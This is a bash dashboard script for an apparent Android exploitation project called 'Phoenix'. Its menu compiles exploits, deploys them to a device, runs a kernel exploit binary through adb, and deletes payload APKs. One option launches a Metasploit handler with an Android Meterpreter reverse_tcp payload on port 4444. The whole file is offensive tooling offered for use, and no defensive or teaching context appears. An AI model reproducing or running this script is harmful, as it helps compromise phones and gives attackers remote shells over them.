#!/bin/bash
# Phoenix Project Dashboard

while true; do
    clear
    echo "╔══════════════════════════════════════════════╗"
    echo "║        🔥 PROJECT PHOENIX DASHBOARD 🔥        ║"
    echo "╠══════════════════════════════════════════════╣"
    echo "║  1. Compile All Exploits                      ║"
    echo "║  2. Deploy to Android Device                  ║"
    echo "║  3. Start MSF Listener                        ║"
    echo "║  4. Run Kernel Exploit                        ║"
    echo "║  5. Generate Report                           ║"
    echo "║  6. View Project Structure                    ║"
    echo "║  7. Clean All Files                           ║"
    echo "║  8. Exit                                      ║"
    echo "╚══════════════════════════════════════════════╝"
    echo ""
    read -p "Select option [1-8]: " choice
    
    case $choice in
        1) ./04_tools/scripts/phoenix_compile.sh ;;
        2) ./04_tools/scripts/phoenix_deploy.sh ;;
        3) msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit" ;;
        4) adb shell /data/local/tmp/phoenix ;;
        5) ./04_tools/scripts/phoenix_report.sh ;;
        6) tree -L 2 ;;
        7) rm -rf 02_payloads/android/*.apk 02_payloads/android/phoenix_* ;;
        8) echo "Exiting..."; exit 0 ;;
        *) echo "Invalid option!" ;;
    esac
    
    read -p "Press Enter to continue..."
done
